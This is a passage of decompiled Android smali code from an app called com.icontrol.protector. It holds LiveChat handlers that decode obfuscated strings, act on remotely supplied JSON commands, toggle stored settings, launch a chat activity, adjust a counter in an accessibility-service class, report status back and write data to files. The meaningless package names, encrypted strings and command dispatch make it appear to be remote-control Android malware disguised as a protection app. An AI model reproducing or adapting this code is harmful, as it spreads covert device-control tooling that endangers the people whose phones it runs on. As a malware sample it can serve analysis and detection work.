    new-array v5, v4, [B

    const/16 v6, 0x71

    const/4 v7, 0x0

    aput-byte v6, v5, v7

    new-array v6, v2, [B

    fill-array-data v6, :array_2

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :goto_0
    invoke-direct {p0}, Lcom/icontrol/protector/LiveChat$a;->w()V

    goto/16 :goto_2

    :catch_0
    move-exception p1

    goto/16 :goto_1

    :cond_0
    new-array v5, v4, [B

    const/16 v6, 0x67

    aput-byte v6, v5, v7

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x5

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v5, v2, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v4, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x6

    new-array v5, v5, [B

    fill-array-data v5, :array_8

    new-array v6, v2, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v5, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v6, v2, [B

    fill-array-data v6, :array_b

    invoke-static {v1, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->J:Ljava/lang/String;

    invoke-static {v0, v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->K:Ljava/lang/String;

    invoke-static {v0, v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->L:Ljava/lang/String;

    invoke-static {v0, v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->M:Ljava/lang/String;

    invoke-static {v0, v1, p1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_0

    :cond_1
    new-array p1, v4, [B

    const/16 v0, 0x19

    aput-byte v0, p1, v7

    new-array v0, v2, [B

    fill-array-data v0, :array_c

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    goto/16 :goto_0

    :cond_2
    new-array p1, v4, [B

    const/16 v0, -0x5f

    aput-byte v0, p1, v7

    new-array v0, v2, [B

    fill-array-data v0, :array_d

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/n;->c(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v2, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_3
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0xat
        0x51t
        -0x54t
    .end array-data

    :array_1
    .array-data 1
        -0x6bt
        0x30t
        -0x21t
        0x38t
        0x3t
        -0x4at
        0x10t
        -0x73t
    .end array-data

    :array_2
    .array-data 1
        0x41t
        0x54t
        -0x1ct
        0x64t
        -0x2dt
        0x32t
        -0x34t
        0x17t
    .end array-data

    :array_3
    .array-data 1
        0x56t
        -0x5at
        -0xat
        0x23t
        -0x5t
        -0x71t
        -0x74t
        0x6bt
    .end array-data

    :array_4
    .array-data 1
        -0x1ct
        -0x17t
        -0x63t
    .end array-data

    :array_5
    .array-data 1
        -0x6ct
        -0x80t
        -0xdt
        0x5at
        -0x22t
        -0x4ft
        0x6t
        0x58t
    .end array-data

    :array_6
    .array-data 1
        0x5ct
        -0x1bt
        -0x74t
        -0x77t
        -0x80t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x28t
        -0x74t
        -0x8t
        -0x1bt
        -0x1bt
        -0x54t
        -0x14t
        -0xat
    .end array-data

    :array_8
    .array-data 1
        -0x3dt
        0x49t
        -0x54t
        -0x7dt
        -0x1t
        -0x80t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x51t
        0x2at
        -0x39t
        -0x19t
        -0x6at
        -0xdt
        0x1t
        0x30t
    .end array-data

    :array_a
    .array-data 1
        -0x38t
        0x27t
        0x4at
    .end array-data

    :array_b
    .array-data 1
        -0x44t
        0x5et
        0x3at
        -0x6at
        0x3dt
        -0x78t
        -0x14t
        0x32t
    .end array-data

    :array_c
    .array-data 1
        0x2bt
        -0x5t
        -0x3ct
        0x2bt
        0x3et
        0x63t
        0x7bt
        0xct
    .end array-data

    :array_d
    .array-data 1
        -0x6et
        -0x45t
        -0xet
        -0x5at
        0x20t
        -0x3t
        -0x4at
        0x4at
    .end array-data

    :array_e
    .array-data 1
        0x59t
        0x2ct
        -0x9t
        0x15t
        0x22t
        -0x44t
        -0x1dt
        -0x1dt
        0x78t
        0x3dt
        -0x5t
        0x1et
        0x2ft
        -0x55t
        -0x1ct
    .end array-data

    :array_f
    .array-data 1
        0x11t
        0x4dt
        -0x67t
        0x71t
        0x4et
        -0x27t
        -0x80t
        -0x71t
    .end array-data
.end method

.method private t(Lorg/json/JSONObject;)V
    .locals 6

    .line 1
    const-string v0, ""

    const/4 v1, 0x4

    const/16 v2, 0x8

    :try_start_0
    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_2

    const/4 v3, 0x5

    new-array v4, v3, [B

    fill-array-data v4, :array_2

    new-array v5, v2, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v4, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {}, Lcom/icontrol/protector/ChatActivity;->d()Lcom/icontrol/protector/ChatActivity;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/icontrol/protector/ChatActivity;->d()Lcom/icontrol/protector/ChatActivity;

    move-result-object v0

    iget-boolean v0, v0, Lcom/icontrol/protector/ChatActivity;->f:Z

    if-nez v0, :cond_1

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_0
    :goto_0
    new-instance v0, Landroid/content/Intent;

    iget-object v4, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const-class v5, Lcom/icontrol/protector/ChatActivity;

    invoke-direct {v0, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-wide/16 v3, 0x3e8

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    :try_start_2
    invoke-static {}, Lcom/icontrol/protector/ChatActivity;->d()Lcom/icontrol/protector/ChatActivity;

    move-result-object p1

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v3, v2, [B

    fill-array-data v3, :array_7

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0, v1}, Lcom/icontrol/protector/ChatActivity;->c(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :goto_1
    const/16 v0, 0xd

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v1, v2, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_2
    :goto_2
    return-void

    :array_0
    .array-data 1
        0x5et
        -0x16t
        -0x3et
        -0x31t
    .end array-data

    :array_1
    .array-data 1
        0x3at
        -0x75t
        -0x4at
        -0x52t
        -0x8t
        0xdt
        -0x23t
        0x62t
    .end array-data

    :array_2
    .array-data 1
        -0x4et
        -0x79t
        -0x59t
        0x32t
        -0x36t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x3at
        -0x12t
        -0x2dt
        0x5et
        -0x51t
        0x6ft
        -0x33t
        -0x5bt
    .end array-data

    :array_4
    .array-data 1
        0x46t
        -0x54t
        -0x76t
        0x3dt
        0x45t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x32t
        -0x3bt
        -0x2t
        0x51t
        0x20t
        -0x62t
        0x5dt
        0x70t
    .end array-data

    :array_6
    .array-data 1
        0x30t
        0x13t
        0x26t
        -0x1bt
        0x11t
        0x7dt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x63t
        0x76t
        0x48t
        -0x7ft
        0x74t
        0xft
        -0x1ct
        0x65t
    .end array-data

    :array_8
    .array-data 1
        -0x66t
        -0x45t
        0x3ft
        -0x29t
        -0x5et
        0x8t
        0x36t
        -0x73t
        -0x5ft
        -0x57t
        0x30t
        -0x2ct
        -0x55t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x2et
        -0x26t
        0x51t
        -0x4dt
        -0x32t
        0x6dt
        0x5bt
        -0x18t
    .end array-data
.end method

.method private u(Lorg/json/JSONObject;)V
    .locals 7

    .line 1
    const/4 v0, 0x3

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const-string v3, ""

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v5, -0x4d

    const/4 v6, 0x0

    aput-byte v5, v4, v6

    new-array v5, v1, [B

    fill-array-data v5, :array_2

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->T:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_2

    :catch_0
    move-exception p1

    goto/16 :goto_1

    :cond_0
    new-array v0, v0, [B

    fill-array-data v0, :array_3

    new-array v4, v1, [B

    fill-array-data v4, :array_4

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/4 v4, 0x5

    if-eqz v0, :cond_2

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    new-array v2, v1, [B

    fill-array-data v2, :array_6

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v3, [B

    const/16 v5, -0x2c

    aput-byte v5, v2, v6

    new-array v5, v1, [B

    fill-array-data v5, :array_7

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    new-array v0, v3, [B

    const/16 v2, -0x7b

    aput-byte v2, v0, v6

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    sget p1, Lcom/icontrol/protector/AccessServices;->q:I

    const/16 v0, 0x50

    if-ge p1, v0, :cond_3

    add-int/2addr p1, v4

    :goto_0
    sput p1, Lcom/icontrol/protector/AccessServices;->q:I

    goto :goto_2

    :cond_1
    sget p1, Lcom/icontrol/protector/AccessServices;->q:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const/16 v0, 0xa

    if-le p1, v0, :cond_3

    sub-int/2addr p1, v4

    goto :goto_0

    :cond_2
    :try_start_2
    new-array v0, v3, [B

    const/16 v3, 0x9

    aput-byte v3, v0, v6

    new-array v3, v1, [B

    fill-array-data v3, :array_9

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->T:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-array v0, v4, [B

    fill-array-data v0, :array_a

    new-array v2, v1, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_c

    new-array v3, v1, [B

    fill-array-data v3, :array_d

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p1}, Lcom/icontrol/protector/LiveChat;->e(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :goto_1
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :catch_1
    :cond_3
    :goto_2
    return-void

    :array_0
    .array-data 1
        0x5t
        0x76t
        -0x1et
    .end array-data

    :array_1
    .array-data 1
        0x66t
        0x17t
        -0x6ft
        -0x64t
        -0x42t
        -0x58t
        -0x2at
        -0x2at
    .end array-data

    :array_2
    .array-data 1
        -0x7dt
        -0x4ft
        0x7t
        0x0t
        0x4at
        0x28t
        -0x5bt
        -0x46t
    .end array-data

    :array_3
    .array-data 1
        0x23t
        -0x1ct
        -0x29t
    .end array-data

    :array_4
    .array-data 1
        0x59t
        -0x75t
        -0x46t
        -0x40t
        -0x39t
        -0x4ct
        0x6et
        -0x60t
    .end array-data

    :array_5
    .array-data 1
        0x67t
        -0x75t
    .end array-data

    nop

    :array_6
    .array-data 1
        0x1ft
        -0xft
        -0x4at
        0x3et
        0x3et
        0x1at
        0x25t
        0x22t
    .end array-data

    :array_7
    .array-data 1
        -0x1ct
        0x2t
        -0x45t
        0x69t
        -0x1bt
        -0x5t
        0x2ct
        -0x18t
    .end array-data

    :array_8
    .array-data 1
        -0x4ct
        -0x79t
        0x69t
        -0x7at
        0x20t
        -0x3bt
        -0x71t
        -0xct
    .end array-data

    :array_9
    .array-data 1
        0x38t
        0x59t
        -0xbt
        0x6dt
        -0x28t
        0x28t
        -0x55t
        -0x57t
    .end array-data

    :array_a
    .array-data 1
        -0x5ft
        -0xbt
        -0x59t
        -0x30t
        -0x62t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x2et
        -0x62t
        -0x32t
        -0x4ct
        -0x8t
        0x75t
        0x1ft
        0x35t
    .end array-data

    :array_c
    .array-data 1
        -0x7bt
        -0xct
        -0x73t
        0x15t
    .end array-data

    :array_d
    .array-data 1
        -0x15t
        -0x7ft
        -0x1ft
        0x79t
        -0x7bt
        0x56t
        -0x1at
        -0x31t
    .end array-data

    :array_e
    .array-data 1
        0x3et
        0x67t
        -0x3dt
        0x3t
        -0xft
        -0x13t
        -0x3dt
        -0x2bt
        0x4t
        0x63t
        -0x38t
        0x9t
        -0x11t
        -0x13t
        -0x2ft
        -0x2et
    .end array-data

    :array_f
    .array-data 1
        0x76t
        0x6t
        -0x53t
        0x67t
        -0x63t
        -0x78t
        -0x50t
        -0x4at
    .end array-data
.end method

.method private w()V
    .locals 9

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->N:Ljava/lang/String;

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->I:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    :try_start_0
    iget-object v3, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    invoke-static {v3, v4, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const/4 v4, 0x4

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    const/16 v6, 0x8

    new-array v7, v6, [B

    fill-array-data v7, :array_1

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v7, v4, [B

    fill-array-data v7, :array_2

    new-array v8, v6, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v5, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v4, [B

    fill-array-data v5, :array_4

    new-array v7, v6, [B

    fill-array-data v7, :array_5

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v5, v6, [B

    fill-array-data v5, :array_7

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_8

    new-array v2, v6, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v1, v0}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0x7t
        -0x2et
        0x5ft
        -0x3t
    .end array-data

    :array_1
    .array-data 1
        0x73t
        -0x55t
        0x2ft
        -0x68t
        0xet
        0x4ct
        0x66t
        -0xet
    .end array-data

    :array_2
    .array-data 1
        -0x73t
        0xbt
        0x72t
        0x22t
    .end array-data

    :array_3
    .array-data 1
        -0x1ft
        0x64t
        0x11t
        0x49t
        -0x74t
        -0x67t
        -0x52t
        0x56t
    .end array-data

    :array_4
    .array-data 1
        -0x1ct
        0x13t
        -0x5dt
        -0x32t
    .end array-data

    :array_5
    .array-data 1
        -0x73t
        0x60t
        -0x31t
        -0x5bt
        -0x7t
        0x77t
        0x21t
        0x61t
    .end array-data

    :array_6
    .array-data 1
        0x1bt
        -0x5ct
        -0x5ft
        -0x5t
        -0x11t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x78t
        -0x3bt
        -0x2ft
        -0x69t
        -0x7ct
        -0x1t
        0x51t
        -0x76t
    .end array-data

    :array_8
    .array-data 1
        -0x39t
        -0x68t
        0x4bt
        0x23t
    .end array-data

    :array_9
    .array-data 1
        -0x5ct
        -0x9t
        0x2ft
        0x50t
        -0x5at
        -0x39t
        -0x2ft
        0x53t
    .end array-data
.end method

.method private y(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .line 1
    const/16 v0, 0x8

    :try_start_0
    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    invoke-interface {v1, p2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/List;

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {v2}, Ljava/io/File;->createNewFile()Z

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_4

    :cond_0
    :goto_0
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, [B

    invoke-virtual {v3, v2}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception p1

    goto :goto_2

    :cond_1
    :try_start_2
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    const/16 v1, 0xc

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v2, v0, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v0, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

